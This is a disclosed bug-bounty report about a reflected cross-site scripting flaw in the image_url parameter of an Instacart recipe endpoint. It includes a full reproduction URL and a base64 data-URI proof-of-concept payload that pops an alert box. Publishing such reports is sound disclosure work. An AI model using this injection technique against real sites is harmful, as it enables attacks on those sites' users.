# XSS at in instacart.com/store/partner_recipe

## Report Details
- **Report ID**: 227809
- **URL**: https://hackerone.com/reports/227809
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-05-12T00:41:11.892Z
- **Disclosed**: 2017-05-30T17:24:23.067Z

## Reporter
- **Username**: ak1t4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
### Summary

Hi team, i found that this endpoint -> https://www.instacart.com/store/partner_recipe? at param ```image_url``` is vulnerable to XSS

#### Reproduction Steps & PoC

1)Go to ```https://www.instacart.com/store/partner_recipe?recipe_url=http://&partner_name=&ingredients[]=apples&ingredients[]=butter&ingredients[]=Splenda+Brown+Sugar+Blend&ingredients[]=cinnamon&ingredients[]=nutmeg&title="Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4 ```
2) Right Click on link "See Image" or open image in new window
3) You see the alert popup 

{F183896}
{F183895}

**Vulnerable Enpoint :** ```https://www.instacart.com/store/partner_recipe? ```
**Vulnerable Param:** ``` image_url```
**Vulnerable Payload:** ```data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4```

**Tested on Browserss**: Latest **Firefox** & **Chrome**

Let me know if more info needed or anything else,

king regards,
@ak1t4




## Attachments
- Captura_de_pantalla_2017-05-11_a_las_21.32.38.png
- Captura_de_pantalla_2017-05-11_a_las_21.32.33.png
